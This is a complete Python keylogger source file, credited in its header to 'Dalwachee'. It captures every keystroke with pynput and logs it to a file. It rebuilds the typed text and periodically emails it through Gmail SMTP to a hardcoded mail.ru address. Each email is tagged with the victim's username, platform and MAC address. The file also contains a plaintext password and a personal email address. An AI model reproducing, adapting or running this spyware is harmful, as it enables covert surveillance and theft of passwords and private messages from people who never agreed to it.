
# ################

# Keyloger By Dalwachee

# ################

import sys
import uuid
import socket
import smtplib
import logging
from time import *
from getpass import getuser
from pynput.keyboard import Listener
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


def MACaddress():
  self = hex(uuid.getnode()).replace('0x', '').upper()
  self = '-'.join(self[i: i + 2] for i in range(0, 11, 2))
  return self


# ################ Globals

File = "data/keyboard.log"
server = "www.google.com"
Length = 128
Session = 0
SMTPserver = "smtp.gmail.com"
CheckTime = int(time() + 5)
ClickCounter = 0
Delete = list()
Text = list()
Log = list()

# ################ Email Information

#sender email and password
email = ''
password = '8mustafa8'

#resever email
resever = 'sajjad.jawad.alkhafaji@mail.ru'

#setup subject and the message to be sent
subject = "[{0}] - [{1}] - [{2}]".format(getuser(), sys.platform, MACaddress())
message = ""


def startup():
    global FileLog
    FileLog = open(File, "w")
    FileLog.write("")
    FileLog.close()


def connected(self):
  try:
    ip = socket.gethostbyname(self)
    return True
  except:
    pass
    return False


def position(self):
    global Delete
    Delete = []
    for i in self:
        if 'Key.backspace' in i:
            Delete.append(self.index(i) - 1)
    return Delete


def letters(self):
    global Delete
    Text = []
    Delete = position(self)
    for i in range(len(Delete)):
        Delete = position(self)[0]
        del self[Delete], self[Delete]

    for i in self:
        if 'Key.space' in i:
            Text.append(i.replace('Key.space', "' '"))
        if 'Key.enter' in i:
            Text.append(i.replace('Key.enter', "'\n'"))
        else:
            Text.append(i)
    return  translator(Text)


def translator(self):
    global Text
    Text = temp = ""
    counter = 0
    letters = 0
    for i in self:
        temp += i
    for i in temp:
        counter += 1
        if i == "'":
            letters += 1
            if letters % 2 == 0:
                pass
            else:
                Text += temp[counter]
    return Text


def email_server(email, password, resever, message):
    global SMTPserver
    prfix = MIMEMultipart()
    prfix['From'] = email
    prfix['To'] = resever
    prfix['Subject'] = subject
    prfix.attach(MIMEText(message, 'plain'))
    server = smtplib.SMTP(SMTPserver, 587)
    server.starttls()
    server.login(email, password)
    message = prfix.as_string()
    server.sendmail(email, resever, message)
    server.quit()


def send():
    global Log, message
    message = "\n{1}\n+Keylog Session Number {0}\n".format(Session, asctime())
    message += letters(Log)
    email_server(email, password, resever, message)


def clear():
    global File, Session, ClickCounter, Log, Text
    Log = Text = []
    ClickCounter = 0
    FileLog = open(File, "w")
    FileLog.write("\n{1}\n+Keylog Session Number {0}\n".format(Session, asctime()))
    FileLog.close()


def process():
    global File, CheckTime, ClickCounter, Log
    if connected(server):
        CheckTime = int(time() + 5)
        # Read File
        file = open(File, "r")
        lines = file.readlines()
        file.close()
        Log.extend(list(lines))
        # Send And Clear
        send()
        clear()
    else:
        sleep(5)
        process()


def clock():
    global Session
    Session += 1
    if int(time()) == CheckTime :
        process()
    else:
        if int(time()) > CheckTime:
            process()
        else:
            pass


def on_press(key):
    global Length, ClickCounter
    logging.info(str(key))
    ClickCounter += 1
    if ClickCounter > Length:
        clock()
    else:
        pass


def on_release(key):
    """
    :param key:
    :return:
    """


if __name__ == "__main__":
    ######################
    startup()
    ######################
    logging.basicConfig(filename=(File), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    ######################
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
